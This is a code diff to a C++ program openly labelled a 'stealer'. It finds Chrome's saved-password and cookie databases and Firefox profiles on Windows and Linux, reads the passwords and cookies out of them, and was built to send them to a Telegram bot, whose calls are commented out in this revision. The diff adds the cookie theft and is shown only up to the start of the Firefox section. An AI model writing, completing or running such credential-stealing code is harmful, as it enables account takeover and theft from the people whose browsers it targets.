@@ -4,7 +4,7 @@
 // Description : stealer in C++
 //============================================================================
 
-#include "sender.h"
+//#include "sender.h"
 #include <experimental/filesystem>
 #include <iostream>
 #include <string>
@@ -40,46 +40,71 @@ int main()
         const std::string TOKEN(""); //put your bot token here
         const long ID = long(); // set your chat id here
 
-        TgBot::Bot bot(TOKEN);
+        //TgBot::Bot bot(TOKEN);
 
-        Sender bot_sender(bot);
+        //Sender bot_sender(bot);
 
 #ifdef __linux__
-        std::string chrome_db_path = "~/.config/google-chrome/Default";
-        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
+        std::string chrome_pass_path = "~/.config/google-chrome/Default";
+        std::string firefox_pass_path = "~/.mozilla/firefox/<profilename>";
 
 #else _WIN32
         TCHAR username[255];
         DWORD username_len = 255;
         GetUserName((TCHAR*)username, &username_len);
 
-        String chrome_db_path = _T("C:\\Users\\");
-        chrome_db_path += username;
-        chrome_db_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
+        String chrome_pass_path = _T("C:\\Users\\");
+        chrome_pass_path += username;
+        chrome_pass_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
 
-        String firefox_db_path = _T("C:\\Users\\");
-        firefox_db_path += username;
-        firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
+        String chrome_cookies_path = _T("C:\\Users\\");
+        chrome_cookies_path += username;
+        chrome_cookies_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");
+
+        String firefox_pass_path = _T("C:\\Users\\");
+        firefox_pass_path += username;
+        firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
 #endif
 
-        if( fs::exists(chrome_db_path))
+        if( fs::exists(chrome_pass_path))
         {
             std::stringstream pass;
             
-            int rc = sqlite3_open(chrome_db_path.c_str(), &db);
+            int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
             if( rc )
             {
                 std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
+                //bot_sender.send(ID, "DB Error: " + sqlite3_errmsg(db));
                 sqlite3_close(db);
-                return 1;
             }
-            pass = get_chrome_pass(db);
-            bot_sender.send(ID, pass.str());
-            
-            //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
+            else
+            {
+                pass = get_chrome_pass(db);
+                //bot_sender.send(ID, pass.str());
+                std::cout << pass.str();
+            }
         }
 
-        if( fs::exists(firefox_db_path))
+        if( fs::exists(chrome_cookies_path))
+        {
+            std::stringstream cookies;
+
+            int rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
+            if( rc )
+            {
+                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
+                //bot_sender.send(ID, "DB Error: " + sqlite3_errmsg(db));
+                sqlite3_close(db);
+            }
+            else
+            {
+                cookies = get_chrome_cookies(db);
+                //bot_sender.send(ID, cookies.str());
+                std::cout << cookies.str();
+            }
+        }
+
+        if( fs::exists(firefox_pass_path))
         {
             std::cout << "ff exists" << std::endl;
             //bot_sender.send(ID, "ff exists");
